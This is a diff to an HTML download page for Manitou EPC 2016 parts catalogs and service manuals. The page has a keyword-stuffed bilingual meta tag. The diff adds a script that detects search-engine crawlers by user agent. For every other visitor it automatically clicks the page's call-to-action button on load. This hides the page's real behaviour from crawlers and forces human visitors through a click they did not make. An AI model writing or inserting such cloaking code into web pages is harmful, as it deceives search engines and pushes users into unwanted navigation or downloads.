@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Manitou EPC 2016 + Service Manuals 2007</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Comprehensive Manitou EPC 2016 and Service Manuals 2007, detailed parts catalogs, available for download in PDF format.">
     <meta name="keywords" content="Manitou EPC 2016, Manitou Service Manuals 2007, Manitou EPC 2016 free download, Manitou EPC 2016 download, Manitou EPC 2016 high speed download, Manitou EPC 2016 PDF, Manitou Service Manuals 2007 PDF, Manitou Service Manuals 2007 free download, Manitou EPC service manuals, Manitou parts catalog 2016, Manitou parts catalog free download, Manitou parts catalog, Manitou 80 VJR parts, Manitou 105 VJR2 parts, Manitou 110 VJR2 parts, Manitou MC 40-70 powershift parts catalogue, Manitou MSI 20-25-30-35 parts catalogue, Manitou MT 1330SL-1637SL parts catalogue, Manitou MT 1440 SL parts, Manitou MVT 660 parts, Manitou MVT 670 parts, Manitou MVT 730 parts, Manitou MVT 930 parts, Manitou TMT 320 parts, Manitou Transmission parts catalog, Manitou MLT 630 turbo parts, Маниту каталог запчастей 2016, Маниту сервисные руководства 2007, Manitou EPC 2016 скачать бесплатно, Маниту руководство по ремонту скачать, Manitou каталог деталей скачать, Каталог Маниту скачать бесплатно, Маниту 105 VJR2 детали, Маниту MLT634 запчасти, Маниту MT 1330SL руководство по ремонту">
     <style>
